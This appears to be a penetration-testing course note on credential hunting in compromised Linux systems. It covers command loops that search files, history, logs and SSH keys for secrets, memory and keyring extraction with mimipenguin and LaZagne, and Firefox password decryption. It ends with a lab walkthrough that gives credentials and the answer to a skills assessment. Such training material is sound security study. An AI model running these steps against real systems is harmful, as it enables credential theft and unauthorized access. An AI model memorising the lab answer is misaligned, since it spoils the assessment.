# 17 — Credential Hunting in Linux

## Overview

After gaining access to a Linux system, credential hunting is one of the first privilege escalation steps. Credentials can be found in four main categories:

| Category | Examples |
|----------|----------|
| **Files** | Configs, databases, notes, scripts, cronjobs, SSH keys |
| **History** | Logs, command-line history |
| **Memory** | Cache, in-memory processing |
| **Key-rings** | Browser stored credentials |

---

## File-Based Credential Hunting

### Configuration Files (.conf, .config, .cnf)

```bash
# Find all config files
for l in $(echo ".conf .config .cnf"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done

# Search config files for credentials
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: " $i
  grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#"
done
```
> First loop finds all config files by extension. Second loop opens each `.cnf` file and searches for credential keywords, filtering out commented lines with `grep -v "\#"`. Suppress errors with `2>/dev/null`.

### Database Files

```bash
for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB File extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```
> Searches the filesystem for database files by extension. Filters out system library paths to reduce noise. SQLite `.db` files can often be opened directly with `sqlite3` and queried for credential tables.

### Notes and Text Files

```bash
# Find .txt files and files with no extension in home dirs
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
> Finds text files and extensionless files in user home directories. Users often store notes with passwords in plain text or with no extension. Focus on subdirectories like `Documents`, `Desktop`, and `Downloads`.

### Scripts (may contain hardcoded creds)

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nFile extension: " $l
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```
> Finds all scripts and compiled code files by extension. Scripts for automation, deployment, and database backups frequently contain hardcoded credentials. Filter out system library paths to focus on user-written files.

### Cronjobs

```bash
# System-wide crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.*/
```
> Shows scheduled jobs that run automatically. Scripts in cronjobs often contain hardcoded credentials for databases or remote systems. Check `cron.d/`, `cron.daily/`, `cron.weekly/`, and `cron.monthly/`.

### SSH Keys

```bash
# Search for private keys
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
```
> Finds SSH private key files and authorized_keys files anywhere on the system. Unprotected private keys can be used to log into other systems. `authorized_keys` reveals which keys are trusted on this host.

---

## History-Based Credential Hunting

### Command-Line History

```bash
# Check all users' bash history
tail -n5 /home/*/.bash*

# Also check .bashrc and .bash_profile
cat /home/*/.bashrc /home/*/.bash_profile 2>/dev/null
```
> Shows the last 5 lines of every user's bash history. Passwords typed as command arguments (like `-p mypass`) appear here in plaintext. `.bashrc` may contain exported variables with API keys or credentials.

### Log Files

| Log File | Description |
|----------|-------------|
| `/var/log/messages` | Generic system activity |
| `/var/log/syslog` | Generic system activity |
| `/var/log/auth.log` | Authentication logs (Debian) |
| `/var/log/secure` | Authentication logs (RedHat/CentOS) |
| `/var/log/boot.log` | Booting information |
| `/var/log/dmesg` | Hardware/driver logs |
| `/var/log/kern.log` | Kernel warnings/errors |
| `/var/log/faillog` | Failed login attempts |
| `/var/log/cron` | Cron job logs |
| `/var/log/mail.log` | Mail server logs |
| `/var/log/httpd` | Apache logs |
| `/var/log/mysqld.log` | MySQL server logs |

```bash
# Search logs for interesting keywords
for i in $(ls /var/log/* 2>/dev/null); do
  GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null)
  if [[ $GREP ]]; then
    echo -e "\n#### Log file: " $i
    grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null
  fi
done
```
> Searches all log files for security-relevant events. Only prints files that actually contain matches. `COMMAND=` lines from sudo logs show exactly what commands were run and by whom. Useful for mapping privileged activity.

---

## Memory and Cache

### Mimipenguin (requires root)

Extracts credentials from memory for logged-in users:

```bash
sudo python3 mimipenguin.py
# [SYSTEM - GNOME]    cry0l1t3:WLpAEXFa0SbqOHY
```
> Extracts credentials from memory for currently logged-in users. Requires root. Works on GNOME, KDE, and other desktop sessions that cache credentials in memory. Output shows `[session type]  username:password`.

### LaZagne (requires root)

Extracts credentials from many sources:

```bash
sudo python2.7 laZagne.py all
```
> Runs all LaZagne modules on Linux. Requires root for full coverage (memory, shadow, keyrings). Replace `python2.7` with `python3` for newer versions. Targets browsers, mail clients, SSH configs, and more.

LaZagne sources include: Wifi, wpa_supplicant, Libsecret, Kwallet, Chromium-based, CLI, Mozilla, Thunderbird, Git, ENV variables, Grub, Fstab, AWS, Filezilla, Gftp, SSH, Apache, Shadow, Docker, Keepass, Mimipy, Sessions, Keyrings.

---

## Browser Credentials

### Firefox

Credentials stored encrypted in `logins.json`:

```bash
# Find Firefox profiles
ls -l .mozilla/firefox/ | grep default

# View encrypted logins
cat .mozilla/firefox/<profile>/logins.json | jq .
```
> Lists Firefox profiles and then shows the encrypted credential JSON. The passwords are encrypted with a key stored in `key4.db` in the same profile directory — use `firefox_decrypt.py` to decrypt them.

### Firefox Decrypt (requires Python 3.9)

```bash
python3.9 firefox_decrypt.py
# Select profile → outputs plaintext credentials
```
> Decrypts Firefox saved passwords using the local profile's `key4.db`. Requires Python 3.9+ for the latest version. Run it from the user's home directory or pass the profile path as an argument.

### LaZagne (browsers module)

```bash
python3 laZagne.py browsers
```
> Runs only the browser module of LaZagne. Targets Chrome, Chromium, Firefox, Opera, and others. Faster than running `all` when you only need browser credentials.

---

## Quick Reference: One-Liner Searches

| Target | Command |
|--------|---------|
| Config files | `find / -name "*.conf" -o -name "*.config" -o -name "*.cnf" 2>/dev/null` |
| Passwords in files | `grep -rnw '/' -e 'password' --include='*.conf' 2>/dev/null` |
| Database files | `find / -name "*.sql" -o -name "*.db" 2>/dev/null` |
| Scripts | `find / -name "*.sh" -o -name "*.py" -o -name "*.pl" 2>/dev/null` |
| SSH keys | `find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null` |
| Bash history | `tail -n20 /home/*/.bash_history 2>/dev/null` |
| Cronjobs | `cat /etc/crontab; ls -la /etc/cron.*/` |

---

## Key Takeaways

- Adapt your search to the system's role (DB server, web server, workstation)
- Configuration files (`.conf`, `.cnf`, `.config`) frequently contain credentials
- Bash history often exposes passwords passed as command arguments
- Cronjobs and automation scripts commonly have hardcoded credentials
- LaZagne and mimipenguin automate credential extraction from memory and apps
- Firefox stores encrypted creds in `logins.json` — use `firefox_decrypt.py` to read them
- Log files reveal authentication events, failed logins, and sudo usage
- Keyrings provide OS-level password management — another target for extraction

---

## Skills Assessment Walkthrough

**Target:** SSH to 10.129.202.64 as kira (`L0vey0u1!`)

```bash
ssh kira@10.129.202.64
```
> Connects to the target as kira using password authentication. Once logged in, start hunting credentials from this account's perspective.

### Step 1: Check Bash History

```bash
tail -n20 /home/*/.bash_history 2>/dev/null
```
> Reads the last 20 lines of every user's bash history. Shows the trail of commands — file paths, credentials, and tools used. Look for `su`, `ssh`, `mysql`, or any command that takes a `-p` argument.

Revealed kira navigated to a Firefox profile directory (`ytb95ytb.default-release/`), viewed `logins.json`, and ran `su` — indicating credential reuse and Firefox stored passwords.

### Step 2: Explore Home Directories

```bash
ls -la /home/
# Found: kira, sam, will
ls -la /home/will/
# Found: .backups/ directory (world-readable)
ls -la /home/will/.backups/
# Found: passwd.bak (readable), shadow.bak (not readable as kira)
```
> Lists home directories and checks other users' files. `-la` shows hidden directories (dot-dirs). `.backups/` is a common location for sensitive backup files. Check permissions on each file to see what's readable.

### Step 3: Check Firefox Stored Credentials

```bash
# Found encrypted logins
cat /home/kira/.mozilla/firefox/ytb95ytb.default-release/logins.json
# Shows encrypted credentials for https://dev.inlanefreight.com
```
> Shows the Firefox encrypted logins file. The `encryptedPassword` and `encryptedUsername` fields are base64-encoded and AES-encrypted. They can only be decrypted with the profile's `key4.db`.

### Step 4: Decrypt Firefox Credentials

Transfer `firefox_decrypt.py` to the target (no internet on box):

```bash
# On LOCAL machine — download compatible version
curl -o /tmp/firefox_decrypt.py https://raw.githubusercontent.com/unode/firefox_decrypt/refs/tags/1.0.0/firefox_decrypt.py

# Fix Python 3.8 compatibility (list[dict] → List[Dict])
sed -i 's/PWStore = list\[dict\[str, str\]\]/from typing import List, Dict\nPWStore = List[Dict[str, str]]/' /tmp/firefox_decrypt.py

# SCP to target
scp /tmp/firefox_decrypt.py kira@10.129.202.64:/tmp/firefox_decrypt.py
```
> Downloads firefox_decrypt.py to the attack host, patches it for Python 3.8 compatibility, then transfers it to the target with SCP. Run this locally when the target has no internet access.

Then on the target:

```bash
python3 /tmp/firefox_decrypt.py /home/kira/.mozilla/firefox/ytb95ytb.default-release/
```
> Decrypts Firefox credentials from the specified profile directory. It reads `logins.json` and decrypts each entry using `key4.db`. Output shows the website, username, and plaintext password.

Output:
```
Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'
```

### Answer

| User | Password | Source |
|------|----------|--------|
| will | `TUqr7QfLTLhruhVbCP` | Firefox stored credentials (decrypted via firefox_decrypt.py) |

### Lessons Learned

- Bash history reveals what the user was doing — follow their trail
- Firefox `logins.json` contains encrypted credentials; `key4.db` holds the decryption key
- `firefox_decrypt.py` requires matching Python version — v1.0.0 uses `list[dict]` (Python 3.9+), fix with `from typing import List, Dict`
- When the target has no internet, SCP tools from your local machine
- Always check `.backups/` and similar directories in user home folders
